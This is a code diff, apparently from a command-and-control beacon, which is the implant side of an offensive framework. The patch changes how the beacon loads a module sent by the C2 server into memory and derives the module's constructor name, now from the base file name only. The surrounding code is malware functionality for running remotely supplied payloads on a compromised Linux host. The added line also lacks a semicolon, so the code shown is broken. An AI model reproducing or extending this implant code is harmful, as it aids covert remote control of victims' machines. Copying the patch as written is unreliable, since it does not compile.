@@ -675,9 +675,10 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 #ifdef __linux__
 
 		const std::string inputfile = c2Message.inputfile();
+		std::string baseFilename = inputfile.substr(inputfile.find_last_of("/\\") + 1)
 		const std::string buffer = c2Message.data();
 
-		SPDLOG_DEBUG("LoadC2Module inputfile {}, buffer {}", inputfile, buffer.size());
+		SPDLOG_DEBUG("LoadC2Module inputfile {}, buffer {}", baseFilename, buffer.size());
 
 		void* handle = NULL;
 		handle = MemoryLoadLibrary((char*)buffer.data(), buffer.size());
@@ -692,7 +693,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		
 		// The exported function that expose the constructor must be releated to the libreary file name
 		// file name = libExposedFunctionName.so <-> Exported function name = ExposedFunctionNameConstructor
-		std::string funcName = inputfile;
+		std::string funcName = baseFilename;
 		funcName = funcName.substr(3); 							// remove lib
 		funcName = funcName.substr(0, funcName.length() - 3);	// remove .so
 		funcName += "Constructor";								// add Constructor
